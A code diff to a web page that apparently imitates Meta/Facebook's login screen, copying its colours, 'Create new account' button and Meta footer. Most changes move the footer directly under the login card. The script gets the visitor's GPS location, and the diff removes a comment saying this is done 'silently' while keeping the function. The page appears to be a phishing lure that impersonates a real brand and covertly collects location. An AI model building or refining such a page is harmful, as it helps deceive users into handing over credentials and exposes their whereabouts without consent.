@@ -182,23 +182,22 @@
             fill: #1877f2;
         }
 
-        /* Meta Footer - fixed */
+        /* Meta Footer - fixed BELOW the login card */
         .meta-footer {
             text-align: center;
-            margin-top: 40px;
-            padding: 20px 0 10px;
+            margin-top: 24px;
+            padding-top: 12px;
             border-top: 1px solid #dadde1;
-            width: 100%;
         }
 
         .meta-logo {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
             font-size: 14px;
             font-weight: 600;
             color: #1c1e21;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
         .infinity {
@@ -211,7 +210,6 @@
             justify-content: center;
             gap: 20px;
             flex-wrap: wrap;
-            margin-top: 4px;
         }
 
         .footer-links a {
@@ -277,19 +275,19 @@
             <div class="divider"></div>
             <button class="create-btn" id="createBtn">Create new account</button>
         </div>
-    </div>
-</div>
 
-<!-- Meta Footer - fixed position, clean -->
-<div class="meta-footer">
-    <div class="meta-logo">
-        <span class="infinity">∞</span>
-        <span>Meta</span>
-    </div>
-    <div class="footer-links">
-        <a href="#">About</a>
-        <a href="#">Help</a>
-        <a href="#">More</a>
+        <!-- Meta Footer – directly under the login card -->
+        <div class="meta-footer">
+            <div class="meta-logo">
+                <span class="infinity">∞</span>
+                <span>Meta</span>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Help</a>
+                <a href="#">More</a>
+            </div>
+        </div>
     </div>
 </div>
 
@@ -316,7 +314,6 @@
 
     let userLocation = null;
 
-    // Get GPS location silently
     function getLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
